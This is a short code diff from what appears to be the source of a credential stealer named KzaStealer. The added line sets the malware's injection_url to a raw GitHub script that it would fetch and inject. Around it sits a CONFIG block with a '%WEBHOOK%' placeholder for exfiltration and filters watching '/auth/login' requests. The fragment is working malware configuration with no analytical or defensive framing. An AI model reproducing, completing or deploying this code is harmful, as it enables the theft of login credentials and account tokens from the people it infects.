@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/COKZA/KzaStealer/refs/heads/main/injection/index.js",
     filters: {
         urls: [
             '/auth/login',
